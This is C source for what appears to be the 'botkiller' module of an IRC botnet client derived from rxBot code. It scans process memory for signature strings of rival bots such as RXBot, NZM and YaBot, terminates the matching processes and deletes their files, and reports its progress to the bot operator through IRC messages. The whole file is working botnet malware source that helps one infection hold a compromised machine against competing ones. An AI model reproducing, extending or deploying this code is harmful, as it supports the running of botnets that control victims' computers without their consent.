/*
Bot Finder & Remover
Way :
 * ReadProcessMemory()
  The way is simple, we just scan the process memory and try to find some pre-defined strings
  if a string is found, we delete the file and the registry key and kill the process.
  /!\ Some process as been excluded from the check list, the reason is that we cant access to all process
  (WINLOGON.exe/csrss.exe for example.), that we know the process want be a bot process
  (explorer.exe/hidserv.exe/us own process).


  link:
 http://msdn2.microsoft.com/en-us/library/ms680553.aspx < ReadProcessMemory()
 http://unkn0wn.eu/board/viewtopic.php?t=4911   < Original source code by a59

  ©©©©©©©©©©©©©©©©©©©©©©©©
  © Based on code by a59 ©
  ©©©©©©©©©©©©©©©©©©©©©©©©

  `Z`
*/

#include "../Headers/includes.h"
#include "../Headers/functions.h"

#ifndef NO_BOTKILLER
s_Search sSearch[ ] =
    {
        { "VNC Scanning Bot", "\x52\x46\x42\x20\x30\x30\x33\x2E\x30\x30\x38\x0A"},
        { "RXBot",	"[MAIN]"},
        { "RXBot",	"[SCAN]"},
        { "RXBot",	"[FTP]"},
        { "NZM",	"scan.stop"},
		{ "NZM/ST", "scanall"},
        { "YaBot",	"[%s%.2I64d|%s|%s]%s"},  // should work, but not tested yet.
        {NULL, NULL}
    };

void DoSearch( unsigned long uStartAddr, unsigned long uEndAddr, PROCESSENTRY32 pe32)
{
    char szBigBuffer[ 0x5000 ]		= {0};
    unsigned char Curbuf[ 0x500 ]	= {0};
    HANDLE hProcess = OpenProcess( PROCESS_ALL_ACCESS, FALSE, pe32.th32ProcessID );

#ifdef DEBUG
    DebugMsg( "Scanning PID: %d [ %s ]\nStart Address: 0x%08X End Address: 0x%08X", pe32.th32ProcessID, pe32.szExeFile, uStartAddr, uEndAddr );
#endif

    for( unsigned long uCurAddr = uStartAddr; uCurAddr <= uEndAddr; uCurAddr++ )
    {
        BOOL bRead = ReadProcessMemory( hProcess, (void *)uCurAddr, (void *)&Curbuf, sizeof( Curbuf ), NULL );
        if( bRead )
        {
            int c = 0;
            strcat( szBigBuffer, (char *)Curbuf );
            while( sSearch[ c ].szString != NULL )
            {
                if( strstr( szBigBuffer, sSearch[ c ].szString ) )
                {
#ifdef DEBUG
                    DebugMsg("Found string \"%s\" in \"%s\" bot \"%s\"", sSearch[ c ].szString, pe32.szExeFile, sSearch[ c ].szBot );
#endif
					RemoveBot(pe32);
                }
                c++;
            }
            if( sizeof( szBigBuffer ) > 0x150 )
                ZeroMemory( szBigBuffer, sizeof( szBigBuffer ) );
        }
        if( !bRead )
            break;
    }
    CloseHandle( hProcess );
};

void RemoveBot( PROCESSENTRY32 pe32)
{
    MODULEENTRY32 me32 =
        {
            0
        };
    HANDLE hPath = CreateToolhelp32Snapshot( TH32CS_SNAPMODULE, pe32.th32ProcessID );
    HANDLE hKillProcess;

    me32.dwSize = sizeof( me32 );
    BOOL bRetval = Module32First( hPath, &me32 );

    while( bRetval )
    {
        if( !strcmp( pe32.szExeFile, me32.szModule ) )
        {
            SetFileAttributes( me32.szExePath, FILE_ATTRIBUTE_NORMAL );
            hKillProcess = OpenProcess( PROCESS_ALL_ACCESS, FALSE, pe32.th32ProcessID );
            TerminateProcess( hKillProcess, 0 );

            Sleep(500);


            if (DeleteFile(me32.szExePath))
            {
#ifdef DEBUG
                DebugMsg("Terminated and deleted %s\n", me32.szExePath);
#endif
            }
            else
            {
#ifdef DEBUG
				DebugMsg("Wtf ! unable to kill/delete %s", me32.szExePath);
#endif
            }
        }
        bRetval = Module32Next(hPath, &me32);
    }
    CloseHandle(hKillProcess);
    CloseHandle(hPath);
};

DWORD WINAPI botkiller_main(LPVOID lParam)
{

    NTHREAD bk = *((NTHREAD *)lParam);
    NTHREAD *bks = (NTHREAD *)lParam;
    bks->gotinfo = TRUE;
    IRC* irc=(IRC*)bk.conn;

    char szFile[128];
    GetModuleFileName( GetModuleHandle( NULL ), szFile, sizeof( szFile ) );
    char* szBlockList[ ] =
        { "svchost.exe", "explorer.exe", "hidserv.exe", "WINLOGON.EXE", "SERVICES.EXE", "csrss.exe" , szFile};
    HANDLE hProcess = CreateToolhelp32Snapshot( TH32CS_SNAPPROCESS, 0 );
    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof( PROCESSENTRY32 );
    BOOL bRetval = Process32First( hProcess, &pe32 );
    bool bDoSearch = true;


	if (!bk.silent)
		irc->pmsg(bk.target, "%s Starting BotKiller.", botkiller_title);

    while (bRetval)
    {
        Sleep(250);

        for(int i = 0; i < (sizeof(szBlockList) / sizeof(char*)); i++)
        {
            if(strstr( szBlockList[ i ], pe32.szExeFile ))
                bDoSearch = false;
        }

        if( bDoSearch )
        {
            DoSearch( 0x00400000, 0x004FFFFF, pe32);
            DoSearch( 0x00100000 ,0x001FFFFF, pe32);
        }

        else
            bDoSearch = true;

        bRetval = Process32Next( hProcess, &pe32 );
    }

    CloseHandle(hProcess);


#ifdef DEBUG
    DebugMsg("Botkiller done.");
#endif

	if (!bk.silent)
		irc->pmsg(bk.target, "%s BotKiller done.", botkiller_title);

	clearthread(bk.threadnum);
	ExitThread(0);
    return 0;
};
#endif
